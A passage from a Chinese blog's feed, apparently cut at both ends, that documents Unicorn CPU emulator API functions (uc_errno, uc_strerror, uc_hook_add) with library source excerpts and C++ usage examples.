UC_ERR_ARG;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//// Initialize emulator in X86-32bit mode</span></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> result[] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    err = uc_query(uc, UC_QUERY_ARCH, result);   <span class="comment">// 查询架构</span></span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"查询成功: "</span> &lt;&lt; *result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例关闭成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出</p><p><a href="https://i.loli.net/2020/01/18/ZtRKvUoaPTlshJ4.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/18/ZtRKvUoaPTlshJ4.png" class="lazyload"></a></p><p>架构查询结果为4，对应的正是UC_ARCH_X86</p><h3 id="uc-errno"><a href="#uc-errno" class="headerlink" title="uc_errno"></a>uc_errno</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_errno</span><span class="params">(uc_engine *uc)</span></span>;</span><br></pre></td></tr></table></figure></div><p>当某个API函数失败时，报告最后的错误号，一旦被访问，uc_errno可能不会保留原来的值。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line"></span><br><span class="line">@return: 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_errno</span><span class="params">(uc_engine *uc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> uc-&gt;errnum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line"></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_errno(uc);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"错误号： "</span> &lt;&lt; err &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例关闭成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出</p><p><a href="https://i.loli.net/2020/01/18/IZhyWrGebA5tT4i.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/18/IZhyWrGebA5tT4i.png" class="lazyload"></a></p><p>无错误，输出错误号为0</p><h3 id="uc-strerror"><a href="#uc-strerror" class="headerlink" title="uc_strerror"></a>uc_strerror</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">uc_strerror</span><span class="params">(uc_err code)</span></span>;</span><br></pre></td></tr></table></figure></div><p>返回给定错误号的解释</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@code: 错误号</span><br><span class="line"></span><br><span class="line">@return: 指向给定错误号的解释的字符串指针</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">uc_strerror</span><span class="params">(uc_err code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(code) &#123;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Unknown error code"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_OK:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"OK (UC_ERR_OK)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_NOMEM:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"No memory available or memory not present (UC_ERR_NOMEM)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_ARCH:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid/unsupported architecture (UC_ERR_ARCH)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_HANDLE:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid handle (UC_ERR_HANDLE)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_MODE:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid mode (UC_ERR_MODE)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_VERSION:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Different API version between core &amp; binding (UC_ERR_VERSION)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_READ_UNMAPPED:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid memory read (UC_ERR_READ_UNMAPPED)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_WRITE_UNMAPPED:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid memory write (UC_ERR_WRITE_UNMAPPED)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_FETCH_UNMAPPED:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid memory fetch (UC_ERR_FETCH_UNMAPPED)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_HOOK:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid hook type (UC_ERR_HOOK)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_INSN_INVALID:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid instruction (UC_ERR_INSN_INVALID)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_MAP:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid memory mapping (UC_ERR_MAP)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_WRITE_PROT:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Write to write-protected memory (UC_ERR_WRITE_PROT)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_READ_PROT:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Read from non-readable memory (UC_ERR_READ_PROT)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_FETCH_PROT:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Fetch from non-executable memory (UC_ERR_FETCH_PROT)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_ARG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid argument (UC_ERR_ARG)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_READ_UNALIGNED:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Read from unaligned memory (UC_ERR_READ_UNALIGNED)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_WRITE_UNALIGNED:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Write to unaligned memory (UC_ERR_WRITE_UNALIGNED)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_FETCH_UNALIGNED:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Fetch from unaligned memory (UC_ERR_FETCH_UNALIGNED)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_RESOURCE:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Insufficient resource (UC_ERR_RESOURCE)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_EXCEPTION:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Unhandled CPU exception (UC_ERR_EXCEPTION)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_TIMEOUT:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Emulation timed out (UC_ERR_TIMEOUT)"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line">    </span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_errno(uc);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"错误号： "</span> &lt;&lt; err &lt;&lt; <span class="string">"  错误描述： "</span> &lt;&lt; uc_strerror(err) &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例关闭成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出</p><p><a href="https://i.loli.net/2020/01/18/MbZk8KjQFqJOxmd.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/18/MbZk8KjQFqJOxmd.png" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Unicorn-CPU模拟框架数据类型及API分析与示例-二&quot;&gt;&lt;a href=&quot;#Unicorn-CPU模拟框架数据类型及API分析与示例-二&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Unicorn-CPU模拟框架数据类型及API分析与示例(四)</title>
    <link href="https://kabeor.github.io/Unicorn-CPU%E6%A8%A1%E6%8B%9F%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B(%E5%9B%9B)/"/>
    <id>https://kabeor.github.io/Unicorn-CPU%E6%A8%A1%E6%8B%9F%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B(%E5%9B%9B)/</id>
    <published>2020-02-12T16:00:00.000Z</published>
    <updated>2020-03-16T04:51:04.442Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unicorn-CPU模拟框架数据类型及API分析与示例-四"><a href="#Unicorn-CPU模拟框架数据类型及API分析与示例-四" class="headerlink" title="Unicorn-CPU模拟框架数据类型及API分析与示例(四)"></a>Unicorn-CPU模拟框架数据类型及API分析与示例(四)</h1><h2 id="0x2-API分析"><a href="#0x2-API分析" class="headerlink" title="0x2 API分析"></a>0x2 API分析</h2><h3 id="uc-hook-add"><a href="#uc-hook-add" class="headerlink" title="uc_hook_add"></a>uc_hook_add</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_hook_add</span><span class="params">(uc_engine *uc, uc_hook *hh, <span class="keyword">int</span> type, <span class="keyword">void</span> *callback,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">void</span> *user_data, <span class="keyword">uint64_t</span> <span class="built_in">begin</span>, <span class="keyword">uint64_t</span> <span class="built_in">end</span>, ...)</span></span>;</span><br></pre></td></tr></table></figure></div><p>注册hook事件的回调，当hook事件被触发将会进行回调。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@hh: 注册hook得到的句柄. uc_hook_del() 中使用</span><br><span class="line">@type: hook 类型</span><br><span class="line">@callback: 当指令被命中时要运行的回调</span><br><span class="line">@user_data: 用户自定义数据. 将被传递给回调函数的最后一个参数 @user_data</span><br><span class="line">@begin: 回调生效区域的起始地址(包括)</span><br><span class="line">@end: 回调生效区域的结束地址(包括)</span><br><span class="line">  注意 1: 只有回调的地址在[@begin, @end]中才会调用回调</span><br><span class="line">  注意 2: 如果 @begin &gt; @end, 每当触发此hook类型时都会调用回调</span><br><span class="line">@...: 变量参数 (取决于 @type)</span><br><span class="line">  注意: 如果 @type &#x3D; UC_HOOK_INSN, 这里是指令ID (如: UC_X86_INS_OUT)</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_hook_add</span><span class="params">(uc_engine *uc, uc_hook *hh, <span class="keyword">int</span> type, <span class="keyword">void</span> *callback,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">void</span> *user_data, <span class="keyword">uint64_t</span> <span class="built_in">begin</span>, <span class="keyword">uint64_t</span> <span class="built_in">end</span>, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = UC_ERR_OK;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hook</span> *<span class="title">hook</span> = <span class="title">calloc</span>(1, <span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">hook</span>));</span></span><br><span class="line">    <span class="keyword">if</span> (hook == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hook-&gt;<span class="built_in">begin</span> = <span class="built_in">begin</span>;</span><br><span class="line">    hook-&gt;<span class="built_in">end</span> = <span class="built_in">end</span>;</span><br><span class="line">    hook-&gt;type = type;</span><br><span class="line">    hook-&gt;callback = callback;</span><br><span class="line">    hook-&gt;user_data = user_data;</span><br><span class="line">    hook-&gt;refs = <span class="number">0</span>;</span><br><span class="line">    *hh = (uc_hook)hook;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// UC_HOOK_INSN 有一个额外参数：指令ID</span></span><br><span class="line">    <span class="keyword">if</span> (type &amp; UC_HOOK_INSN) &#123;</span><br><span class="line">        va_list valist;</span><br><span class="line"></span><br><span class="line">        va_start(valist, <span class="built_in">end</span>);</span><br><span class="line">        hook-&gt;insn = va_arg(valist, <span class="keyword">int</span>);</span><br><span class="line">        va_end(valist);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (uc-&gt;insn_hook_validate) &#123;</span><br><span class="line">            <span class="keyword">if</span> (! uc-&gt;insn_hook_validate(hook-&gt;insn)) &#123;</span><br><span class="line">                <span class="built_in">free</span>(hook);</span><br><span class="line">                <span class="keyword">return</span> UC_ERR_HOOK;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (uc-&gt;hook_insert) &#123;</span><br><span class="line">            <span class="keyword">if</span> (list_insert(&amp;uc-&gt;hook[UC_HOOK_INSN_IDX], hook) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">free</span>(hook);</span><br><span class="line">                <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (list_append(&amp;uc-&gt;hook[UC_HOOK_INSN_IDX], hook) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">free</span>(hook);</span><br><span class="line">                <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        hook-&gt;refs++;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((type &gt;&gt; i) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((type &gt;&gt; i) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; UC_HOOK_MAX) &#123;</span><br><span class="line">                <span class="keyword">if</span> (uc-&gt;hook_insert) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (list_insert(&amp;uc-&gt;hook[i], hook) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (hook-&gt;refs == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="built_in">free</span>(hook);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (list_append(&amp;uc-&gt;hook[i], hook) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (hook-&gt;refs == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="built_in">free</span>(hook);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                hook-&gt;refs++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hook-&gt;refs == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">free</span>(hook);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> syscall_abi[] = &#123;</span><br><span class="line">    UC_X86_REG_RAX, UC_X86_REG_RDI, UC_X86_REG_RSI, UC_X86_REG_RDX,</span><br><span class="line">    UC_X86_REG_R10, UC_X86_REG_R8, UC_X86_REG_R9</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> vals[<span class="number">7</span>] = &#123; <span class="number">200</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* ptrs[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uc_perror</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* func, uc_err err)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error in %s(): %s\n"</span>, func, uc_strerror(err));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASE 0x10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// mov rax, 100; mov rdi, 1; mov rsi, 2; mov rdx, 3; mov r10, 4; mov r8, 5; mov r9, 6; syscall</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x48\xc7\xc0\x64\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc6\x02\x00\x00\x00\x48\xc7\xc2\x03\x00\x00\x00\x49\xc7\xc2\x04\x00\x00\x00\x49\xc7\xc0\x05\x00\x00\x00\x49\xc7\xc1\x06\x00\x00\x00\x0f\x05"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hook_syscall</span><span class="params">(uc_engine* uc, <span class="keyword">void</span>* user_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    uc_reg_read_batch(uc, syscall_abi, ptrs, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"syscall: &#123;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">", "</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%"</span> PRIu64, vals[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&#125;\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hook_code</span><span class="params">(uc_engine* uc, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> size, <span class="keyword">void</span>* user_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"HOOK_CODE: 0x%"</span> PRIx64 <span class="string">", 0x%x\n"</span>, addr, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    uc_hook sys_hook;</span><br><span class="line">    uc_err err;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span 